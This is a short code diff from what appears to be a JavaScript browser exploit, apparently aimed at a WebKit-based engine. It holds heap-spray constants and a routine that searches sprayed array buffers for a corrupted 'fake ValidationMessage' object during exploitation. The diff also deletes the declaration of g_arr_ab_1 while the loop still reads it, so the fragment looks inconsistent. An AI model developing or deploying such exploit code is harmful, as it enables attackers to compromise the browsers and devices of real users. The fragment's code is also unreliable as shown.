@@ -17,7 +17,6 @@ const SPRAY_STRINGIMPL = 0x1000;
 const NB_FRAMES = 0xfa0;
 const NB_REUSE = 0x8000;
 
-var g_arr_ab_1 = [];
 var g_arr_ab_2 = [];
 var g_arr_ab_3 = [];
 
@@ -363,7 +362,7 @@ function dumpTargetObj() {
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
-		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
+		if (!Int64.fromDouble(g_arr_ab_1[i][3]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
